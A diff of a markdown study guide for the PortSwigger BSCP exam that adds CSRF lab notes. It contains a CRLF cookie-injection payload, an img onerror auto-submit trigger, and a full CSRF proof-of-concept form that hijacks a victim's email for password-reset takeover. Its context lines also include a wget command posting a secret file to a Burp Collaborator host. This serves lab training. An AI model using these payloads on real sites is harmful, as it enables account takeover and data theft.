@@ -1512,7 +1512,8 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ## CSRF  
 
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform.  
-  
+### OAuth  
+
 >oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
 
 ![csrf](images/csrf.png)  
@@ -1524,8 +1525,6 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ```  
 
 [PortSwigger Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)  
-  
-  
 ### Referer CSRF  
 
 >***Identify*** change email vulnerable to the referer header to validate being part of the referer header value.  
@@ -1563,7 +1562,44 @@ Referrer-Policy: unsafe-url
 ![referer csrf](images/referer-csrf.png)  
 
 [PortSwigger Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)  
+  
+## LastSearchTerm  
 
+>***Identify*** the CSRF vulnerability where token not tied to non-session cookie, by changing the **csrfkey** cookie result in rejected. Observe the LastSearchTerm cookie value containing the user supplied input ***indentifier***.  
+
+![identify-csrf-non-session-tied.png](images/identify-csrf-non-session-tied.png)  
+
+>Search function has no CSRF protection, create below payload that injects new line characters ```%0d%0a``` to set new cookie value in response, and use this to inject cookies into the victim user's browser.  
+
+```
+/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None
+```  
+
+>Generate CSRF POC, Enable the option to include an **auto-submit** script and click **Regenerate**. Replace the **auto-submit** script code block and add following instead. The **onerror** of the img src tag will instead submit the CSRF POC.  
+
+```
+<img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```  
+
+>During BSCP **Exam** set the email change value to that of the exploit server ***hacker@exploit-server.net*** email address. Then abose the password reset for the administrator.  
+
+![csrf-set-cookie-poc.png](images/csrf-set-cookie-poc.png)  
+
+```html
+<html>
+  <body>
+    <script>history.pushState('', '', '/')</script>
+    <form action="https://0ad7008b03099fdccf6c199100dd00e0.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker&#64;exploit&#45;0a18002e03379f0ccf16180f01180022&#46;exploit&#45;server&#46;net" />
+      <input type="hidden" name="csrf" value="48hizVRa9oJ1slhOIPljozUAjqDMdplb" />
+      <input type="submit" value="Submit request" />
+    </form>
+	<img src="https://0ad7008b03099fdccf6c199100dd00e0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None" onerror="document.forms[0].submit()">    
+  </body>
+</html>
+```  
+
+[PortSwigger Lab: CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)  
   
 ## File Path Traversal
 
